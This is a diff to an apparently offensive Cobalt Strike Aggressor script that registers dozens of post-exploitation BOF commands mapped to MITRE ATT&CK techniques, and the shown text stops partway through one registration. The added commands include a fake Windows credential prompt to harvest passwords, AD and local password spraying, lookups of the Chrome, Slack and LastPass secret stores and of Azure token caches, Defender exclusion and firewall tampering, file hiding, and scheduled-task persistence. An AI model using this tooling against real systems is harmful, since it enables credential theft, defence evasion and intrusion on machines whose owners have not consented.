@@ -21,14 +21,18 @@
 # Phase 4 — C2-Collection       (8 BOFs)
 # Phase 5 — Persistence         (2 BOFs)
 # Phase 6 — Loader              (1 BOF)
-# Total: 82 registered commands (81 BOFs + dani-help meta)
+# Phase 2 gap-fill — SA (21 BOFs)
+# Phase 3 gap-fill — Remote-Ops (26 BOFs)
+# Phase 4 gap-fill — OperatorsKit (23 BOFs)
+# Phase 5 gap-fill — C2-Collection (5 BOFs)
+# Total: 158 registered commands (157 BOFs + dani-help meta)
 
 # ============================================================
 # LOAD-TIME BANNER
 # ============================================================
 println("============================================================");
 println("  DEF-Situational-Awareness-BOF  //  by Dani");
-println("  81 BOFs across 6 phases loaded");
+println("  157 BOFs across 6 phases loaded");
 println("  Type 'dani-help' in a beacon for the full command list.");
 println("============================================================");
 
@@ -1877,6 +1881,925 @@ beacon_command_register(
     "Phase: 6 — Loader\nArgs: <bof-path> [entry=go] [args]"
 );
 
+
+# ============================================================
+# PHASE 2 GAP-FILL — Situational Awareness (21 new BOFs)
+# ============================================================
+
+# --- adcs-enum ---
+alias adcs-enum {
+    dani_run($1, "adcs-enum", "");
+}
+beacon_command_register(
+    "adcs-enum",
+    "ADCS CA enumeration via registry — T1518.001 (by Dani)",
+    "Synopsis: adcs-enum\n\nDescription: Walk HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Services\\CertSvc\\Configuration to enumerate Certificate Authority names and DNS hostnames without COM or certutil.\n\nMITRE ATT&CK: T1518.001\n\nArgs: none"
+);
+
+# --- adv-audit-policies ---
+alias adv-audit-policies {
+    dani_run($1, "adv-audit-policies", "");
+}
+beacon_command_register(
+    "adv-audit-policies",
+    "Advanced audit policy enumeration — T1082 (by Dani)",
+    "Synopsis: adv-audit-policies\n\nDescription: Enumerate advanced audit policy settings from the registry without auditpol.exe.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
+);
+
+# --- enum-local-sessions ---
+alias enum-local-sessions {
+    dani_run($1, "enum-local-sessions", "");
+}
+beacon_command_register(
+    "enum-local-sessions",
+    "Enumerate local logon sessions — T1033 (by Dani)",
+    "Synopsis: enum-local-sessions\n\nDescription: List active logon sessions via LsaEnumerateLogonSessions.\n\nMITRE ATT&CK: T1033\n\nArgs: none"
+);
+
+# --- get-session-info ---
+alias get-session-info {
+    dani_run($1, "get-session-info", "");
+}
+beacon_command_register(
+    "get-session-info",
+    "RDP/console session info — T1033 (by Dani)",
+    "Synopsis: get-session-info\n\nDescription: Enumerate RDP and console sessions via WTSEnumerateSessions.\n\nMITRE ATT&CK: T1033\n\nArgs: none"
+);
+
+# --- listdns ---
+alias listdns {
+    dani_run($1, "listdns", "");
+}
+beacon_command_register(
+    "listdns",
+    "DNS client cache enumeration — T1016 (by Dani)",
+    "Synopsis: listdns\n\nDescription: Read DNS resolver cache entries from the registry.\n\nMITRE ATT&CK: T1016\n\nArgs: none"
+);
+
+# --- locale ---
+alias locale {
+    dani_run($1, "locale", "");
+}
+beacon_command_register(
+    "locale",
+    "System locale and timezone — T1082 (by Dani)",
+    "Synopsis: locale\n\nDescription: Read system locale, language, and timezone settings.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
+);
+
+# --- md5 ---
+alias md5 {
+    local('$bid $path $args');
+    $bid  = $1;
+    $path = $2;
+    if ($path is $null) { berror($bid, "Use: md5 <filepath>"); return; }
+    $args = bof_pack($bid, "z", $path);
+    dani_run($bid, "md5", $args);
+}
+beacon_command_register(
+    "md5",
+    "MD5 hash a file — T1082 (by Dani)",
+    "Synopsis: md5 <filepath>\n\nDescription: Compute MD5 hash of a file using CryptoAPI without CertUtil.\n\nMITRE ATT&CK: T1082\n\nArgs: <filepath>"
+);
+
+# --- nettime ---
+alias nettime {
+    dani_run($1, "nettime", "");
+}
+beacon_command_register(
+    "nettime",
+    "Domain time synchronization source — T1124 (by Dani)",
+    "Synopsis: nettime\n\nDescription: Query domain time source via NetRemoteTOD.\n\nMITRE ATT&CK: T1124\n\nArgs: none"
+);
+
+# --- netuptime ---
+alias netuptime {
+    dani_run($1, "netuptime", "");
+}
+beacon_command_register(
+    "netuptime",
+    "Network host uptime — T1082 (by Dani)",
+    "Synopsis: netuptime\n\nDescription: Get system uptime via KUSER_SHARED_DATA BootTime.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
+);
+
+# --- netuse ---
+alias netuse {
+    dani_run($1, "netuse", "");
+}
+beacon_command_register(
+    "netuse",
+    "Enumerate mapped network drives — T1135 (by Dani)",
+    "Synopsis: netuse\n\nDescription: List currently connected network shares via NetUseEnum.\n\nMITRE ATT&CK: T1135\n\nArgs: none"
+);
+
+# --- netview ---
+alias netview {
+    dani_run($1, "netview", "");
+}
+beacon_command_register(
+    "netview",
+    "Enumerate network computers — T1018 (by Dani)",
+    "Synopsis: netview\n\nDescription: List visible network computers in the domain via NetServerEnum.\n\nMITRE ATT&CK: T1018\n\nArgs: none"
+);
+
+# --- regsession ---
+alias regsession {
+    dani_run($1, "regsession", "");
+}
+beacon_command_register(
+    "regsession",
+    "Registry session data — T1082 (by Dani)",
+    "Synopsis: regsession\n\nDescription: Read session-related registry data.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
+);
+
+# --- resources ---
+alias resources {
+    dani_run($1, "resources", "");
+}
+beacon_command_register(
+    "resources",
+    "System resources (CPU/memory/disk) — T1082 (by Dani)",
+    "Synopsis: resources\n\nDescription: Report CPU count, total/available physical memory and disk space.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
+);
+
+# --- sc-enum ---
+alias sc-enum {
+    dani_run($1, "sc-enum", "");
+}
+beacon_command_register(
+    "sc-enum",
+    "Service enumeration — T1007 (by Dani)",
+    "Synopsis: sc-enum\n\nDescription: Enumerate all services via EnumServicesStatusExA.\n\nMITRE ATT&CK: T1007\n\nArgs: none"
+);
+
+# --- sc-qc ---
+alias sc-qc {
+    local('$bid $svc $args');
+    $bid = $1; $svc = $2;
+    if ($svc is $null) { berror($bid, "Use: sc-qc <service-name>"); return; }
+    $args = bof_pack($bid, "z", $svc);
+    dani_run($bid, "sc-qc", $args);
+}
+beacon_command_register(
+    "sc-qc",
+    "Service configuration query — T1007 (by Dani)",
+    "Synopsis: sc-qc <service-name>\n\nDescription: Query service configuration via QueryServiceConfigA.\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
+);
+
+# --- sc-qdescription ---
+alias sc-qdescription {
+    local('$bid $svc $args');
+    $bid = $1; $svc = $2;
+    if ($svc is $null) { berror($bid, "Use: sc-qdescription <service-name>"); return; }
+    $args = bof_pack($bid, "z", $svc);
+    dani_run($bid, "sc-qdescription", $args);
+}
+beacon_command_register(
+    "sc-qdescription",
+    "Service description query — T1007 (by Dani)",
+    "Synopsis: sc-qdescription <service-name>\n\nDescription: Query service description string via QueryServiceConfig2A.\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
+);
+
+# --- sc-qfailure ---
+alias sc-qfailure {
+    local('$bid $svc $args');
+    $bid = $1; $svc = $2;
+    if ($svc is $null) { berror($bid, "Use: sc-qfailure <service-name>"); return; }
+    $args = bof_pack($bid, "z", $svc);
+    dani_run($bid, "sc-qfailure", $args);
+}
+beacon_command_register(
+    "sc-qfailure",
+    "Service failure actions query — T1007 (by Dani)",
+    "Synopsis: sc-qfailure <service-name>\n\nDescription: Query service failure recovery actions via QueryServiceConfig2A(SC_ACTION).\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
+);
+
+# --- sc-qtriggerinfo ---
+alias sc-qtriggerinfo {
+    local('$bid $svc $args');
+    $bid = $1; $svc = $2;
+    if ($svc is $null) { berror($bid, "Use: sc-qtriggerinfo <service-name>"); return; }
+    $args = bof_pack($bid, "z", $svc);
+    dani_run($bid, "sc-qtriggerinfo", $args);
+}
+beacon_command_register(
+    "sc-qtriggerinfo",
+    "Service trigger info query — T1007 (by Dani)",
+    "Synopsis: sc-qtriggerinfo <service-name>\n\nDescription: Query service trigger information (start/stop conditions).\n\nMITRE ATT&CK: T1007\n\nArgs: <service-name>"
+);
+
+# --- sha1 ---
+alias sha1 {
+    local('$bid $path $args');
+    $bid = $1; $path = $2;
+    if ($path is $null) { berror($bid, "Use: sha1 <filepath>"); return; }
+    $args = bof_pack($bid, "z", $path);
+    dani_run($bid, "sha1", $args);
+}
+beacon_command_register(
+    "sha1",
+    "SHA1 hash a file — T1082 (by Dani)",
+    "Synopsis: sha1 <filepath>\n\nDescription: Compute SHA1 hash of a file using CryptoAPI.\n\nMITRE ATT&CK: T1082\n\nArgs: <filepath>"
+);
+
+# --- sha256 ---
+alias sha256 {
+    local('$bid $path $args');
+    $bid = $1; $path = $2;
+    if ($path is $null) { berror($bid, "Use: sha256 <filepath>"); return; }
+    $args = bof_pack($bid, "z", $path);
+    dani_run($bid, "sha256", $args);
+}
+beacon_command_register(
+    "sha256",
+    "SHA256 hash a file — T1082 (by Dani)",
+    "Synopsis: sha256 <filepath>\n\nDescription: Compute SHA256 hash of a file using CryptoAPI.\n\nMITRE ATT&CK: T1082\n\nArgs: <filepath>"
+);
+
+# --- vssenum ---
+alias vssenum {
+    dani_run($1, "vssenum", "");
+}
+beacon_command_register(
+    "vssenum",
+    "VSS shadow copy enumeration — T1003.003 (by Dani)",
+    "Synopsis: vssenum\n\nDescription: Enumerate Volume Shadow Copies via registry/WMI.\n\nMITRE ATT&CK: T1003.003\n\nArgs: none"
+);
+
+# ============================================================
+# PHASE 3 GAP-FILL — Remote-Ops (26 new BOFs)
+# ============================================================
+
+# --- processdestroy ---
+alias processdestroy {
+    local('$bid $pid $args');
+    $bid = $1; $pid = $2;
+    if ($pid is $null) { berror($bid, "Use: processdestroy <pid-or-name>"); return; }
+    $args = bof_pack($bid, "z", $pid);
+    dani_run($bid, "processdestroy", $args);
+}
+beacon_command_register(
+    "processdestroy",
+    "Terminate a process by PID or name — T1562.001 (by Dani)",
+    "Synopsis: processdestroy <pid-or-name>\n\nDescription: Terminate a process using TerminateProcess. Accepts numeric PID or process name (Toolhelp32 walk).\n\nMITRE ATT&CK: T1562.001\n\nArgs: <pid-or-name>"
+);
+
+# --- processlisthandles ---
+alias processlisthandles {
+    dani_run($1, "processlisthandles", "");
+}
+beacon_command_register(
+    "processlisthandles",
+    "Enumerate all process handles — T1106 (by Dani)",
+    "Synopsis: processlisthandles\n\nDescription: x64-only. List all open handles system-wide via NtQuerySystemInformation(SystemHandleInformation).\n\nMITRE ATT&CK: T1106\n\nArgs: none"
+);
+
+# --- reg-delete ---
+alias reg-delete {
+    local('$bid $hive $subkey $value $args');
+    $bid = $1; $hive = $2; $subkey = $3; $value = $4;
+    if ($hive is $null || $subkey is $null) { berror($bid, "Use: reg-delete <HKLM|HKCU|...> <subkey> [value]"); return; }
+    if ($value is $null) { $value = ""; }
+    $args = bof_pack($bid, "zzz", $hive, $subkey, $value);
+    dani_run($bid, "reg-delete", $args);
+}
+beacon_command_register(
+    "reg-delete",
+    "Delete a registry value or key — T1112 (by Dani)",
+    "Synopsis: reg-delete <hive> <subkey> [value]\n\nDescription: Delete a registry value (if value given) or empty subkey (no value).\n\nMITRE ATT&CK: T1112\n\nArgs: <hive> <subkey> [value]"
+);
+
+# --- reg-set ---
+alias reg-set {
+    local('$bid $hive $subkey $value $type $data $args');
+    $bid = $1; $hive = $2; $subkey = $3; $value = $4; $type = $5; $data = $6;
+    if ($hive is $null || $subkey is $null || $value is $null || $type is $null || $data is $null) {
+        berror($bid, "Use: reg-set <hive> <subkey> <value> <REG_SZ|REG_DWORD> <data>");
+        return;
+    }
+    $args = bof_pack($bid, "zzzzz", $hive, $subkey, $value, $type, $data);
+    dani_run($bid, "reg-set", $args);
+}
+beacon_command_register(
+    "reg-set",
+    "Create/set a registry value — T1112 (by Dani)",
+    "Synopsis: reg-set <hive> <subkey> <value> <type> <data>\n\nDescription: Create or set REG_SZ, REG_DWORD, or REG_BINARY registry values.\n\nMITRE ATT&CK: T1112\n\nArgs: <hive> <subkey> <value> <REG_SZ|REG_DWORD|REG_BINARY> <data>"
+);
+
+# --- sc-config ---
+alias sc-config {
+    local('$bid $svc $start $binpath $args');
+    $bid = $1; $svc = $2; $start = $3; $binpath = $4;
+    if ($svc is $null || $start is $null) { berror($bid, "Use: sc-config <name> <start-type> [binpath]"); return; }
+    if ($binpath is $null) { $binpath = ""; }
+    $args = bof_pack($bid, "zzz", $svc, $start, $binpath);
+    dani_run($bid, "sc-config", $args);
+}
+beacon_command_register(
+    "sc-config",
+    "Change service start type — T1543.003 (by Dani)",
+    "Synopsis: sc-config <name> <auto|demand|disabled|boot|system> [binpath]\n\nDescription: Modify service start type and optionally the binary path via ChangeServiceConfigA.\n\nMITRE ATT&CK: T1543.003\n\nArgs: <service-name> <start-type> [binpath]"
+);
+
+# --- sc-description ---
+alias sc-description {
+    local('$bid $svc $desc $args');
+    $bid = $1; $svc = $2; $desc = $3;
+    if ($svc is $null || $desc is $null) { berror($bid, "Use: sc-description <name> <description>"); return; }
+    $args = bof_pack($bid, "zz", $svc, $desc);
+    dani_run($bid, "sc-description", $args);
+}
+beacon_command_register(
+    "sc-description",
+    "Set service description string — T1543.003 (by Dani)",
+    "Synopsis: sc-description <name> <description>\n\nDescription: Set the service description string via ChangeServiceConfig2A.\n\nMITRE ATT&CK: T1543.003\n\nArgs: <service-name> <description>"
+);
+
+# --- sc-failure ---
+alias sc-failure {
+    local('$bid $svc $args');
+    $bid = $1; $svc = $2;
+    if ($svc is $null) { berror($bid, "Use: sc-failure <service-name>"); return; }
+    $args = bof_pack($bid, "z", $svc);
+    dani_run($bid, "sc-failure", $args);
+}
+beacon_command_register(
+    "sc-failure",
+    "Set service failure recovery actions — T1543.003 (by Dani)",
+    "Synopsis: sc-failure <service-name>\n\nDescription: Configure service failure actions (restart on failure).\n\nMITRE ATT&CK: T1543.003\n\nArgs: <service-name>"
+);
+
+# --- sc-start ---
+alias sc-start {
+    local('$bid $svc $args');
+    $bid = $1; $svc = $2;
+    if ($svc is $null) { berror($bid, "Use: sc-start <service-name>"); return; }
+    $args = bof_pack($bid, "z", $svc);
+    dani_run($bid, "sc-start", $args);
+}
+beacon_command_register(
+    "sc-start",
+    "Start a service — T1569.002 (by Dani)",
+    "Synopsis: sc-start <service-name>\n\nDescription: Start a service via StartServiceA.\n\nMITRE ATT&CK: T1569.002\n\nArgs: <service-name>"
+);
+
+# --- sc-stop ---
+alias sc-stop {
+    local('$bid $svc $args');
+    $bid = $1; $svc = $2;
+    if ($svc is $null) { berror($bid, "Use: sc-stop <service-name>"); return; }
+    $args = bof_pack($bid, "z", $svc);
+    dani_run($bid, "sc-stop", $args);
+}
+beacon_command_register(
+    "sc-stop",
+    "Stop a service — T1489 (by Dani)",
+    "Synopsis: sc-stop <service-name>\n\nDescription: Stop a running service via ControlService(SERVICE_CONTROL_STOP).\n\nMITRE ATT&CK: T1489\n\nArgs: <service-name>"
+);
+
+# --- shutdown ---
+alias shutdown {
+    local('$bid $action $args');
+    $bid = $1; $action = $2;
+    if ($action is $null) { $action = "s"; }
+    $args = bof_pack($bid, "z", $action);
+    dani_run($bid, "shutdown", $args);
+}
+beacon_command_register(
+    "shutdown",
+    "Shutdown/reboot/logoff — T1529 (by Dani)",
+    "Synopsis: shutdown [s|r|l|f]\n\nDescription: Initiate shutdown (s), reboot (r), logoff (l), or forced (f) after acquiring SeShutdownPrivilege.\n\nMITRE ATT&CK: T1529\n\nArgs: [s|r|l|f] (default: s)"
+);
+
+# --- conhost ---
+alias conhost {
+    dani_run($1, "conhost", "");
+}
+beacon_command_register(
+    "conhost",
+    "Enumerate conhost.exe processes — T1057 (by Dani)",
+    "Synopsis: conhost\n\nDescription: List all conhost.exe PIDs and their parent PIDs via Toolhelp32 snapshot.\n\nMITRE ATT&CK: T1057\n\nArgs: none"
+);
+
+# --- svcctrl ---
+alias svcctrl {
+    local('$bid $action $svc $args');
+    $bid = $1; $action = $2; $svc = $3;
+    if ($action is $null || $svc is $null) { berror($bid, "Use: svcctrl <start|stop|pause|continue> <service-name>"); return; }
+    $args = bof_pack($bid, "zz", $action, $svc);
+    dani_run($bid, "svcctrl", $args);
+}
+beacon_command_register(
+    "svcctrl",
+    "Service start/stop/pause/continue controller — T1489/T1569.002 (by Dani)",
+    "Synopsis: svcctrl <start|stop|pause|continue> <service-name>\n\nDescription: Control service state via SCM ControlService/StartServiceA.\n\nMITRE ATT&CK: T1489, T1569.002\n\nArgs: <action> <service-name>"
+);
+
+# --- ctray ---
+alias ctray {
+    dani_run($1, "ctray", "");
+}
+beacon_command_register(
+    "ctray",
+    "Enumerate system tray windows — T1082 (by Dani)",
+    "Synopsis: ctray\n\nDescription: Enumerate Shell_TrayWnd and system tray child windows via user32 API.\n\nMITRE ATT&CK: T1082\n\nArgs: none"
+);
+
+# --- dde ---
+alias dde {
+    dani_run($1, "dde", "");
+}
+beacon_command_register(
+    "dde",
+    "Check Office DDE registry entries — T1559.002 (by Dani)",
+    "Synopsis: dde\n\nDescription: Check HKCU\\Software\\Microsoft\\Office subkeys for DDE-related configuration.\n\nMITRE ATT&CK: T1559.002\n\nArgs: none"
+);
+
+# --- tooltip ---
+alias tooltip {
+    dani_run($1, "tooltip", "");
+}
+beacon_command_register(
+    "tooltip",
+    "Enumerate tooltips_class32 windows — T1010 (by Dani)",
+    "Synopsis: tooltip\n\nDescription: Enumerate tooltips_class32 windows via FindWindowExA to map visible UI state.\n\nMITRE ATT&CK: T1010\n\nArgs: none"
+);
+
+# --- uxsubclassinfo ---
+alias uxsubclassinfo {
+    dani_run($1, "uxsubclassinfo", "");
+}
+beacon_command_register(
+    "uxsubclassinfo",
+    "Check UxSubclassInfo window hooks — T1055 (by Dani)",
+    "Synopsis: uxsubclassinfo\n\nDescription: Check Shell_TrayWnd and Progman windows for UxSubclassInfo/CC32SubclassInfo properties that indicate EDR/AV window subclassing hooks.\n\nMITRE ATT&CK: T1055\n\nArgs: none"
+);
+
+# --- setthreadcontext ---
+alias setthreadcontext {
+    local('$bid $pid $args');
+    $bid = $1; $pid = $2;
+    if ($pid is $null) { berror($bid, "Use: setthreadcontext <pid>"); return; }
+    $args = bof_pack($bid, "z", $pid);
+    dani_run($bid, "setthreadcontext", $args);
+}
+beacon_command_register(
+    "setthreadcontext",
+    "Enumerate threads and show RIP — T1055.003 (by Dani)",
+    "Synopsis: setthreadcontext <pid>\n\nDescription: x64-only. Enumerate thread IDs for a process and show first thread's RIP via GetThreadContext.\n\nMITRE ATT&CK: T1055.003\n\nArgs: <pid>"
+);
+
+# --- slack-cookie ---
+alias slack-cookie {
+    dani_run($1, "slack-cookie", "");
+}
+beacon_command_register(
+    "slack-cookie",
+    "Enumerate Slack AppData for cookie artifacts — T1539 (by Dani)",
+    "Synopsis: slack-cookie\n\nDescription: List %APPDATA%\\Slack\\ directory contents to identify cookie and session files.\n\nMITRE ATT&CK: T1539\n\nArgs: none"
+);
+
+# --- slackkey ---
+alias slackkey {
+    dani_run($1, "slackkey", "");
+}
+beacon_command_register(
+    "slackkey",
+    "Read Slack Local State DPAPI key — T1539 (by Dani)",
+    "Synopsis: slackkey\n\nDescription: Read first 4096 bytes of %APPDATA%\\Slack\\Local State for DPAPI-encrypted master key.\n\nMITRE ATT&CK: T1539\n\nArgs: none"
+);
+
+# --- chromekey ---
+alias chromekey {
+    dani_run($1, "chromekey", "");
+}
+beacon_command_register(
+    "chromekey",
+    "Read Chrome Local State DPAPI key — T1555.003 (by Dani)",
+    "Synopsis: chromekey\n\nDescription: Read first 1024 bytes of %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State.\n\nMITRE ATT&CK: T1555.003\n\nArgs: none"
+);
+
+# --- office-tokens ---
+alias office-tokens {
+    dani_run($1, "office-tokens", "");
+}
+beacon_command_register(
+    "office-tokens",
+    "Enumerate Office/MSAL token cache paths — T1528 (by Dani)",
+    "Synopsis: office-tokens\n\nDescription: List Office identity token cache directories under %LOCALAPPDATA%.\n\nMITRE ATT&CK: T1528\n\nArgs: none"
+);
+
+# --- lastpass ---
+alias lastpass {
+    dani_run($1, "lastpass", "");
+}
+beacon_command_register(
+    "lastpass",
+    "Locate LastPass credential storage — T1555.003 (by Dani)",
+    "Synopsis: lastpass\n\nDescription: Find LastPass Chrome extension LDB files and %APPDATA%\\LastPass directory.\n\nMITRE ATT&CK: T1555.003\n\nArgs: none"
+);
+
+# --- get-azure-token ---
+alias get-azure-token {
+    dani_run($1, "get-azure-token", "");
+}
+beacon_command_register(
+    "get-azure-token",
+    "Enumerate Azure/MSAL token cache paths — T1528 (by Dani)",
+    "Synopsis: get-azure-token\n\nDescription: Enumerate Azure TokenBroker and MSAL cache directories under %LOCALAPPDATA%.\n\nMITRE ATT&CK: T1528\n\nArgs: none"
+);
+
+# --- ask-mfa ---
+alias ask-mfa {
+    local('$bid $caption $message $args');
+    $bid = $1; $caption = $2; $message = $3;
+    if ($caption is $null) { $caption = "Security Verification Required"; }
+    if ($message is $null) { $message = "Your session requires MFA verification."; }
+    $args = bof_pack($bid, "zz", $caption, $message);
+    dani_run($bid, "ask-mfa", $args);
+}
+beacon_command_register(
+    "ask-mfa",
+    "Fake MFA credential prompt — T1056.002 (by Dani)",
+    "Synopsis: ask-mfa [caption] [message]\n\nDescription: Display a fake Windows credential prompt via CredUIPromptForWindowsCredentialsA to capture typed credentials.\n\nMITRE ATT&CK: T1056.002\n\nArgs: [caption] [message]"
+);
+
+# --- adcs-request ---
+alias adcs-request {
+    dani_run($1, "adcs-request", "");
+}
+beacon_command_register(
+    "adcs-request",
+    "Enumerate ADCS CA from registry — T1649 (by Dani)",
+    "Synopsis: adcs-request\n\nDescription: Read CertSvc registry key to enumerate CA configuration for certificate request targeting.\n\nMITRE ATT&CK: T1649\n\nArgs: none"
+);
+
+# --- adcs-request-on-behalf ---
+alias adcs-request-on-behalf {
+    dani_run($1, "adcs-request-on-behalf", "");
+}
+beacon_command_register(
+    "adcs-request-on-behalf",
+    "Check ESC3 enrollment agent feasibility — T1649 (by Dani)",
+    "Synopsis: adcs-request-on-behalf\n\nDescription: Check HKCU autoenrollment and local CertSvc CA for ESC3 enrollment agent certificate abuse.\n\nMITRE ATT&CK: T1649\n\nArgs: none"
+);
+
+# ============================================================
+# PHASE 4 GAP-FILL — OperatorsKit (23 new BOFs)
+# ============================================================
+
+# --- add-firewall-rule ---
+alias add-firewall-rule {
+    local('$bid $name $dir $proto $port $args');
+    $bid = $1; $name = $2; $dir = $3; $proto = $4; $port = $5;
+    if ($name is $null || $dir is $null || $proto is $null || $port is $null) {
+        berror($bid, "Use: add-firewall-rule <name> <in|out> <TCP|UDP|*> <port>");
+        return;
+    }
+    $args = bof_pack($bid, "zzzz", $name, $dir, $proto, $port);
+    dani_run($bid, "add-firewall-rule", $args);
+}
+beacon_command_register(
+    "add-firewall-rule",
+    "Add Windows Firewall rule via registry — T1562.004 (by Dani)",
+    "Synopsis: add-firewall-rule <name> <in|out> <TCP|UDP|*> <port>\n\nDescription: Write a firewall allow rule directly to the registry.\n\nMITRE ATT&CK: T1562.004\n\nArgs: <name> <in|out> <TCP|UDP|*> <port>"
+);
+
+# --- del-firewall-rule ---
+alias del-firewall-rule {
+    local('$bid $name $args');
+    $bid = $1; $name = $2;
+    if ($name is $null) { berror($bid, "Use: del-firewall-rule <name>"); return; }
+    $args = bof_pack($bid, "z", $name);
+    dani_run($bid, "del-firewall-rule", $args);
+}
+beacon_command_register(
+    "del-firewall-rule",
+    "Delete Windows Firewall rule — T1562.004 (by Dani)",
+    "Synopsis: del-firewall-rule <name>\n\nDescription: Delete a firewall rule by name from the registry.\n\nMITRE ATT&CK: T1562.004\n\nArgs: <name>"
+);
+
+# --- add-local-cert ---
+alias add-local-cert {
+    local('$bid $store $path $args');
+    $bid = $1; $store = $2; $path = $3;
+    if ($store is $null || $path is $null) { berror($bid, "Use: add-local-cert <store> <cert-path>"); return; }
+    $args = bof_pack($bid, "zz", $store, $path);
+    dani_run($bid, "add-local-cert", $args);
+}
+beacon_command_register(
+    "add-local-cert",
+    "Add certificate to local store — T1553.004 (by Dani)",
+    "Synopsis: add-local-cert <store-name> <cert-path>\n\nDescription: Import a DER certificate into a local Windows cert store via CertAddEncodedCertificateToStore.\n\nMITRE ATT&CK: T1553.004\n\nArgs: <store> <cert-path>"
+);
+
+# --- del-local-cert ---
+alias del-local-cert {
+    local('$bid $store $thumb $args');
+    $bid = $1; $store = $2; $thumb = $3;
+    if ($store is $null || $thumb is $null) { berror($bid, "Use: del-local-cert <store> <sha1-thumbprint>"); return; }
+    $args = bof_pack($bid, "zz", $store, $thumb);
+    dani_run($bid, "del-local-cert", $args);
+}
+beacon_command_register(
+    "del-local-cert",
+    "Delete certificate from local store — T1553.004 (by Dani)",
+    "Synopsis: del-local-cert <store> <sha1-thumbprint>\n\nDescription: Delete a certificate from a Windows cert store matching the given SHA1 thumbprint.\n\nMITRE ATT&CK: T1553.004\n\nArgs: <store> <sha1-thumbprint>"
+);
+
+# --- enum-local-cert ---
+alias enum-local-cert {
+    dani_run($1, "enum-local-cert", "");
+}
+beacon_command_register(
+    "enum-local-cert",
+    "Enumerate local certificate stores — T1552.004 (by Dani)",
+    "Synopsis: enum-local-cert\n\nDescription: List certificates in MY, ROOT, CA, and TRUST stores via CertEnumCertificatesInStore.\n\nMITRE ATT&CK: T1552.004\n\nArgs: none"
+);
+
+# --- add-task-scheduler ---
+alias add-task-scheduler {
+    local('$bid $name $cmd $trigger $args');
+    $bid = $1; $name = $2; $cmd = $3; $trigger = $4;
+    if ($name is $null || $cmd is $null) { berror($bid, "Use: add-task-scheduler <name> <command> [trigger]"); return; }
+    if ($trigger is $null) { $trigger = "ONLOGON"; }
+    $args = bof_pack($bid, "zzz", $name, $cmd, $trigger);
+    dani_run($bid, "add-task-scheduler", $args);
+}
+beacon_command_register(
+    "add-task-scheduler",
+    "Add scheduled task via COM — T1053.005 (by Dani)",
+    "Synopsis: add-task-scheduler <name> <command> [trigger]\n\nDescription: Register a scheduled task via ITaskService COM vtable.\n\nMITRE ATT&CK: T1053.005\n\nArgs: <name> <command> [trigger=ONLOGON]"
+);
+
+# --- del-task-scheduler ---
+alias del-task-scheduler {
+    local('$bid $name $args');
+    $bid = $1; $name = $2;
+    if ($name is $null) { berror($bid, "Use: del-task-scheduler <task-name>"); return; }
+    $args = bof_pack($bid, "z", $name);
+    dani_run($bid, "del-task-scheduler", $args);
+}
+beacon_command_register(
+    "del-task-scheduler",
+    "Delete scheduled task via COM — T1053.005 (by Dani)",
+    "Synopsis: del-task-scheduler <task-name>\n\nDescription: Delete a scheduled task via ITaskFolder::DeleteTask COM vtable.\n\nMITRE ATT&CK: T1053.005\n\nArgs: <task-name>"
+);
+
+# --- del-exclusion ---
+alias del-exclusion {
+    local('$bid $type $value $args');
+    $bid = $1; $type = $2; $value = $3;
+    if ($type is $null || $value is $null) { berror($bid, "Use: del-exclusion <path|extension|process> <value>"); return; }
+    $args = bof_pack($bid, "zz", $type, $value);
+    dani_run($bid, "del-exclusion", $args);
+}
+beacon_command_register(
+    "del-exclusion",
+    "Remove Defender exclusion — T1562.001 (by Dani)",
+    "Synopsis: del-exclusion <path|extension|process> <value>\n\nDescription: Delete an AV exclusion from the Windows Defender registry hive.\n\nMITRE ATT&CK: T1562.001\n\nArgs: <path|extension|process> <value>"
+);
+
+# --- hide-file ---
+alias hide-file {
+    local('$bid $path $args');
+    $bid = $1; $path = $2;
+    if ($path is $null) { berror($bid, "Use: hide-file <path>"); return; }
+    $args = bof_pack($bid, "z", $path);
+    dani_run($bid, "hide-file", $args);
+}
+beacon_command_register(
+    "hide-file",
+    "Set file hidden+system attributes — T1564.001 (by Dani)",
+    "Synopsis: hide-file <path>\n\nDescription: Apply HIDDEN|SYSTEM|NOT_CONTENT_INDEXED attributes to a file.\n\nMITRE ATT&CK: T1564.001\n\nArgs: <path>"
+);
+
+# --- password-spray-ad ---
+alias password-spray-ad {
+    local('$bid $users $pass $args');
+    $bid = $1; $users = $2; $pass = $3;
+    if ($users is $null || $pass is $null) { berror($bid, "Use: password-spray-ad <user1,user2,...> <password>"); return; }
+    $args = bof_pack($bid, "zz", $users, $pass);
+    dani_run($bid, "password-spray-ad", $args);
+}
+beacon_command_register(
+    "password-spray-ad",
+    "AD password spray via LogonUserA — T1110.003 (by Dani)",
+    "Synopsis: password-spray-ad <user1,user2,...> <password>\n\nDescription: Test a single password against comma-separated AD usernames using network logon (no lockout from single credential).\n\nMITRE ATT&CK: T1110.003\n\nArgs: <comma-users> <password>"
+);
+
+# --- password-spray-local ---
+alias password-spray-local {
+    local('$bid $users $pass $args');
+    $bid = $1; $users = $2; $pass = $3;
+    if ($users is $null || $pass is $null) { berror($bid, "Use: password-spray-local <user1,user2,...> <password>"); return; }
+    $args = bof_pack($bid, "zz", $users, $pass);
+    dani_run($bid, "password-spray-local", $args);
+}
+beacon_command_register(
+    "password-spray-local",
+    "Local password spray via LogonUserA — T1110.003 (by Dani)",
+    "Synopsis: password-spray-local <user1,user2,...> <password>\n\nDescription: Test a single password against comma-separated local account names.\n\nMITRE ATT&CK: T1110.003\n\nArgs: <comma-users> <password>"
+);
+
+# --- enum-active-hosts ---
+alias enum-active-hosts {
+    local('$bid $subnet $args');
+    $bid = $1; $subnet = $2;
+    if ($subnet is $null) { berror($bid, "Use: enum-active-hosts <x.x.x> (e.g. 192.168.1)"); return; }
+    $args = bof_pack($bid, "z", $subnet);
+    dani_run($bid, "enum-active-hosts", $args);
+}
+beacon_command_register(
+    "enum-active-hosts",
+    "Ping sweep /24 via IcmpSendEcho — T1018 (by Dani)",
